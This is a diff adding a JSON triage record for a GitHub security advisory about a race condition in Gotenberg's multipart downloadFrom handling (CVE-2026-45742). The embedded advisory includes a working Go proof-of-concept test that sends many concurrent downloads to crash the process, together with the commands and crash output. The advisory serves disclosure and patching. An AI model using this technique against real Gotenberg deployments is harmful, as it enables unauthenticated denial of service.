@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/112353771?v=4\", \"events_url\": \"https://api.github.com/users/uokik/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/uokik/followers\", \"following_url\": \"https://api.github.com/users/uokik/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/uokik/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/uokik\", \"id\": 112353771, \"login\": \"uokik\", \"node_id\": \"U_kgDOBrJh6w\", \"organizations_url\": \"https://api.github.com/users/uokik/orgs\", \"received_events_url\": \"https://api.github.com/users/uokik/received_events\", \"repos_url\": \"https://api.github.com/users/uokik/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/uokik/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/uokik/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/uokik\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45742\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-362\", \"name\": \"Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\"}], \"description\": \"### Summary\\n\\nGotenberg is vulnerable to a remote denial of service in multipart `downloadFrom` handling.\\n\\nA multipart request containing multiple `downloadFrom` entries causes concurrent goroutines to write to shared maps without synchronization. This can terminate the process with `fatal error: concurrent map writes`.\\n\\nIn the default configuration, `downloadFrom` is enabled and authentication is disabled, so an exposed instance can be crashed by an unauthenticated remote attacker.\\n\\n### Details\\n\\nThe issue is in `pkg/modules/api/context.go`.\\n\\n`newContext` parses multipart requests and processes the `downloadFrom` form field before the route handler runs. For each `downloadFrom` entry, it starts a goroutine via `errgroup.Go()`:\\n\\n- `pkg/modules/api/context.go:221`\\n\\nEach goroutine downloads a file and then writes to request context maps shared by all goroutines:\\n\\n- `ctx.files[filename] = path`\\n- `ctx.diskToOriginal[path] = filename`\\n- `ctx.filesByField[...] = append(...)`\\n\\nAffected lines in current `main`:\\n\\n- `pkg/modules/api/context.go:395`\\n- `pkg/modules/api/context.go:396`\\n- `pkg/modules/api/context.go:401`\\n\\nGo maps and slices are not safe for concurrent writes. A crafted multipart request with many `downloadFrom` entries can therefore trigger a runtime crash.\\n\\nThe vulnerable `downloadFrom` feature was introduced in commit `f2b6bd3d`. The first tagged release containing this code appears to be `v8.10.0`.\\n\\n### PoC\\n\\nThe following self-contained command creates a temporary test file, runs the PoC, and removes the file afterwards. It does not require any external network access.\\n\\nRun from the repository root:\\n\\n    cat > pkg/modules/api/downloadfrom_race_poc_test.go <<'EOF'\\n    //go:build security_poc\\n\\n    package api\\n\\n    import (\\n        \\\"bytes\\\"\\n        \\\"encoding/json\\\"\\n        \\\"fmt\\\"\\n        \\\"log/slog\\\"\\n        \\\"mime/multipart\\\"\\n        \\\"net/http\\\"\\n        \\\"net/http/httptest\\\"\\n        \\\"sync\\\"\\n        \\\"testing\\\"\\n        \\\"time\\\"\\n\\n        \\\"github.com/labstack/echo/v4\\\"\\n\\n        \\\"github.com/gotenberg/gotenberg/v8/pkg/gotenberg\\\"\\n    )\\n\\n    func TestSecurityPoCDownloadFromConcurrentMapWrites(t *testing.T) {\\n        const downloads = 64\\n\\n        var ready sync.WaitGroup\\n        ready.Add(downloads)\\n        release := make(chan struct{})\\n        var releaseOnce sync.Once\\n\\n        server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\\n            ready.Done()\\n            go func() {\\n                ready.Wait()\\n                releaseOnce.Do(func() {\\n                    close(release)\\n                })\\n            }()\\n            <-release\\n\\n            filename := fmt.Sprintf(\\\"download-%s.txt\\\", r.URL.Query().Get(\\\"i\\\"))\\n            w.Header().Set(\\\"Content-Disposition\\\", fmt.Sprintf(`attachment; filename=\\\"%s\\\"`, filename))\\n            _, _ = w.Write([]byte(\\\"downloaded\\\"))\\n        }))\\n        defer server.Close()\\n\\n        dls := make([]downloadFrom, downloads)\\n        for i := range dls {\\n            dls[i] = downloadFrom{\\n                Url:   fmt.Sprintf(\\\"%s/file?i=%d\\\", server.URL, i),\\n                Field: \\\"embedded\\\",\\n            }\\n        }\\n\\n        payload, err := json.Marshal(dls)\\n        if err != nil {\\n            t.Fatalf(\\\"marshal downloadFrom payload: %v\\\", err)\\n        }\\n\\n        body := new(bytes.Buffer)\\n        writer := multipart.NewWriter(body)\\n        err = writer.WriteField(\\\"downloadFrom\\\", string(payload))\\n        if err != nil {\\n            t.Fatalf(\\\"write downloadFrom field: %v\\\", err)\\n        }\\n        err = writer.Close()\\n        if err != nil {\\n            t.Fatalf(\\\"close multipart writer: %v\\\", err)\\n        }\\n\\n        req := httptest.NewRequest(http.MethodPost, \\\"/forms/libreoffice/convert\\\", body)\\n        req.Header.Set(\\\"Content-Type\\\", writer.FormDataContentType())\\n\\n        echoCtx := echo.New().NewContext(req, httptest.NewRecorder())\\n        logger := slog.New(slog.DiscardHandler)\\n        fs := gotenberg.NewFileSystem(new(gotenberg.OsMkdirAll))\\n        downloadFromCfg := downloadFromConfig{\\n            maxRetry: 0,\\n        }\\n\\n        ctx, cancel, err := newContext(echoCtx, logger, fs, 10*time.Second, 0, downloadFromCfg)\\n        if err != nil {\\n            t.Fatalf(\\\"newContext returned error: %v\\\", err)\\n        }\\n        defer cancel()\\n\\n        if got := len(ctx.files); got != downloads {\\n            t.Fatalf(\\\"downloaded files = %d, want %d\\\", got, downloads)\\n        }\\n    }\\n    EOF\\n\\n    GOTOOLCHAIN=go1.26.2 go test -race -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=1\\n    rm pkg/modules/api/downloadfrom_race_poc_test.go\\n\\nExpected result with the race detector:\\n\\n    WARNING: DATA RACE\\n    Write at ...\\n      github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()\\n        .../pkg/modules/api/context.go:395\\n\\n    WARNING: DATA RACE\\n      .../pkg/modules/api/context.go:396\\n\\n    WARNING: DATA RACE\\n      .../pkg/modules/api/context.go:401\\n\\nRunning the same PoC without `-race` also demonstrates practical process termination:\\n\\n    GOTOOLCHAIN=go1.26.2 go test -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=20\\n\\nObserved result:\\n\\n    fatal error: concurrent map writes\\n    github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()\\n      .../pkg/modules/api/context.go:395\\n    FAIL github.com/gotenberg/gotenberg/v8/pkg/modules/api\\n\\n### Impact\\n\\nThis is a remote denial-of-service vulnerability.\\n\\nAny deployment that exposes multipart conversion endpoints with `downloadFrom` enabled is affected. In the default configuration, `downloadFrom` is enabled and basic authentication is disabled, so internet-exposed default deployments may be vulnerable to unauthenticated process termination.\\n\\nThe vulnerability affects availability only. I did not find evidence of confidentiality or integrity impact.\", \"epss\": {\"percentage\": 0.00138, \"percentile\": 0.33716}, \"ghsa_id\": \"GHSA-vp73-vjw8-8f32\", \"github_reviewed_at\": \"2026-05-29T16:56:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-vp73-vjw8-8f32\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vp73-vjw8-8f32\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45742\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-29T16:56:18Z\", \"references\": [\"https://github.com/gotenberg/gotenberg/security/advisories/GHSA-vp73-vjw8-8f32\", \"https://github.com/gotenberg/gotenberg/releases/tag/v8.33.0\", \"https://github.com/advisories/GHSA-vp73-vjw8-8f32\"], \"repository_advisory_url\": \"https://api.github.com/repos/gotenberg/gotenberg/security-advisories/GHSA-vp73-vjw8-8f32\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/gotenberg/gotenberg\", \"summary\": \"Gotenberg has a Race Condition via Multipart `downloadFrom` Handling\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-29T16:56:19Z\", \"url\": \"https://api.github.com/advisories/GHSA-vp73-vjw8-8f32\", \"vulnerabilities\": [{\"first_patched_version\": \"8.33.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/gotenberg/gotenberg/v8\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 8.10.0, <= 8.32.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vp73-vjw8-8f32",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/gotenberg/gotenberg/v8: >= 8.10.0, <= 8.32.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-45742"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/gotenberg/gotenberg/v8"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.234243Z",
+  "provenance": {
+    "content_sha256": "e02fb9a2951c60ce969847de5f7bf1ae2c4a73c63ace1fe977b9bb6ae52a253c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-29T16:56:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vp73-vjw8-8f32",
+  "status": "active",
+  "title": "Gotenberg has a Race Condition via Multipart `downloadFrom` Handling",
+  "updated_at": "2026-05-29T16:56:19Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vp73-vjw8-8f32"
+}
